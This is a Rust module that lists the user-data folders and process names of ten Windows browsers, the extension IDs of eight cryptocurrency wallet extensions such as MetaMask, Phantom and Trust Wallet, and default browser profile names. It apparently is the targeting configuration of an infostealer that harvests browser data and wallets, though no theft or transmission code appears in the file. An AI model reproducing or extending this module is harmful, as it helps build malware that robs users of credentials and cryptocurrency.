use std::{env, path::PathBuf};

use super::types::{BrowserInfo, ExtensionInfo};

pub fn get_browser_list() -> Vec<BrowserInfo> {
    let local = env::var("LOCALAPPDATA").unwrap_or_default();
    let roaming = env::var("APPDATA").unwrap_or_default();

    vec![
        BrowserInfo {
            name: "Google Chrome",
            path: PathBuf::from(&local)
                .join("Google")
                .join("Chrome")
                .join("User Data"),
            process: "chrome.exe",
        },
        BrowserInfo {
            name: "Google Chrome SxS",
            path: PathBuf::from(&local)
                .join("Google")
                .join("Chrome SxS")
                .join("User Data"),
            process: "chrome.exe",
        },
        BrowserInfo {
            name: "Google Chrome Beta",
            path: PathBuf::from(&local)
                .join("Google")
                .join("Chrome Beta")
                .join("User Data"),
            process: "chrome.exe",
        },
        BrowserInfo {
            name: "Google Chrome Dev",
            path: PathBuf::from(&local)
                .join("Google")
                .join("Chrome Dev")
                .join("User Data"),
            process: "chrome.exe",
        },
        BrowserInfo {
            name: "Microsoft Edge",
            path: PathBuf::from(&local)
                .join("Microsoft")
                .join("Edge")
                .join("User Data"),
            process: "msedge.exe",
        },
        BrowserInfo {
            name: "Brave",
            path: PathBuf::from(&local)
                .join("BraveSoftware")
                .join("Brave-Browser")
                .join("User Data"),
            process: "brave.exe",
        },
        BrowserInfo {
            name: "Opera",
            path: PathBuf::from(&roaming)
                .join("Opera Software")
                .join("Opera Stable"),
            process: "opera.exe",
        },
        BrowserInfo {
            name: "Opera GX",
            path: PathBuf::from(&roaming)
                .join("Opera Software")
                .join("Opera GX Stable"),
            process: "opera.exe",
        },
        BrowserInfo {
            name: "Vivaldi",
            path: PathBuf::from(&local).join("Vivaldi").join("User Data"),
            process: "vivaldi.exe",
        },
        BrowserInfo {
            name: "Yandex",
            path: PathBuf::from(&local)
                .join("Yandex")
                .join("YandexBrowser")
                .join("User Data"),
            process: "yandex.exe",
        },
    ]
}

pub fn get_crypto_extensions() -> Vec<ExtensionInfo> {
    vec![
        ExtensionInfo {
            name: "Metamask",
            extension_id: "nkbihfbeogaeaoehlefnkodbefgpgknn",
        },
        ExtensionInfo {
            name: "Metamask",
            extension_id: "ejbalbakoplchlghecdalmeeeajnimhm",
        },
        ExtensionInfo {
            name: "Binance",
            extension_id: "fhbohimaelbohpjbbldcngcnapndodjp",
        },
        ExtensionInfo {
            name: "Coinbase",
            extension_id: "hnfanknocfeofbddgcijnmhnfnkdnaad",
        },
        ExtensionInfo {
            name: "Phantom",
            extension_id: "bfnaelmomeimhlpmgjnjophhpkkoljpa",
        },
        ExtensionInfo {
            name: "Trust Wallet",
            extension_id: "egjidjbpglichdcondbcbdnbeeppgdph",
        },
        ExtensionInfo {
            name: "Exodus",
            extension_id: "aholpfdialjgjfhomihkjbmgjidlcdno",
        },
        ExtensionInfo {
            name: "Ronin",
            extension_id: "fnjhmkhhmkbjkkabndcnnogagogbneec",
        },
    ]
}

pub fn default_profiles() -> Vec<String> {
    vec![
        String::new(),
        "Default".to_string(),
        "Profile 1".to_string(),
        "Profile 2".to_string(),
        "Profile 3".to_string(),
        "Profile 4".to_string(),
        "Profile 5".to_string(),
    ]
}
